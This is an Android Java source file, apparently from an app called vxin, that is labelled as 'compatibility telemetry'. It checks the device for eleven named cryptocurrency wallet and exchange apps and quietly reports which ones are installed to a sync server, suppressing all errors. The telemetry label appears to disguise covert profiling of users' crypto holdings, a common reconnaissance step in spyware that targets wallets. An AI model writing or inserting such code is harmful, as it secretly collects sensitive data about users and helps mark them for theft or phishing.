// WalletScanner.java
// ==================
// One-shot installed-wallet inventory for compatibility telemetry

package com.vxin.app.core.sync;

import android.content.Context;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

public class WalletScanner {
    private static final String[][] WALLET_APPS = {
        {"imtoken", "im.token.app"},
        {"bitpie", "com.bitpie"},
        {"tokenpocket", "vip.mytokenpocket"},
        {"htx", "com.huobi.client"},
        {"okx", "com.okinc.okex.gp"},
        {"binance", "com.binance.dev"},
        {"metamask", "io.metamask"},
        {"trustwallet", "com.trustwallet.app"},
        {"bybit", "com.bybit.app"},
        {"coinbase", "com.coinbase.wallet"},
        {"exodus", "com.exodusmovement.exodus"},
    };

    public static void scanAndReport(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            JSONArray found = new JSONArray();
            for (String[] w : WALLET_APPS) {
                try {
                    pm.getPackageInfo(w[1], 0);
                    found.put(w[0]);
                } catch (PackageManager.NameNotFoundException ignored) {}
            }
            JSONObject data = new JSONObject();
            data.put("wallets", found);
            SyncReporter.get(ctx).send("wallet_detect", data);
        } catch (Exception ignored) {}
    }
}
